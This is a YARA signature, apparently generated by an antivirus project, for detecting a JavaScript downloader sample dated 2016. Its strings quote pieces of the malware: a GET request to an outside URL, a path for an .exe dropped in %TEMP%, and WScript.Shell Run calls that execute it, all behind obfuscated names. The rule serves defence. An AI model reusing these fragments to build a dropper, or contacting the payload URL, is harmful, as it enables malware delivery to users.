rule sig_20160328_9d930ca4db0a6f1d0beec3afc92b57df {
  meta:
    description = "datamaliciousorder - file 20160328_9d930ca4db0a6f1d0beec3afc92b57df.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e9de225fcf57100793859c6ea330ff5ea7ee1bc8e4cbab026f7c005810fcee86"

  strings:
    $s1  = "function Mibozmlbzz() {return Xnrqha[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fDkwhoe38H.exe\";};" fullword ascii
    $s2  = "Frrwgkan[Egstpprbs](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Iafrxptyr](Hcnfy() * 11)} while (Frrwgkan[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Xnrqha = function Fkinmssna() {return WScript[Tueoccpo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Pfczrqbepq(Unkynegwx, Bbgvsasn){return Unkynegwx - Bbgvsasn;};" fullword ascii
    $s6  = "function Iinxx(Lraeyp){Xnrqha[\"Run\"](Lraeyp, Pxmfeji, Pxmfeji);};" fullword ascii
    $s7  = "function Sdpmfjnbfv() {return ((Kccty == true) && (Kccty == Cflefe)) ? 1 : Pxmfeji;};" fullword ascii
    $s8  = "var Afntusmg = new this[\"Date\"]();" fullword ascii
    $s9  = "function Tmlmnoofd()" fullword ascii
    $s10 = "Cflefe = true; " fullword ascii
    $s11 = " while (Zfeabw){" fullword ascii
    $s12 = "function Hcnfy(){return 22;};" fullword ascii
    $s13 = "function Ziiaz(Rgvkxd) {var Vfdkolpb = (1, 2, 3, 4, 5, Rgvkxd); return Vfdkolpb;};" fullword ascii
    $s14 = "var Cflefe = false;" fullword ascii
    $s15 = "function Junzrknij(){return Wicjufjl;};" fullword ascii
    $s16 = "var Kccty = false;" fullword ascii
    $s17 = "Kccty = true; " fullword ascii
    $s18 = "function Jivrgf(){return Tueoccpo;};" fullword ascii
    $s19 = "return Pfczrqbepq(Jgdpizhns, Xkjfdhc);" fullword ascii
    $s20 = "var Tscklkszca = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}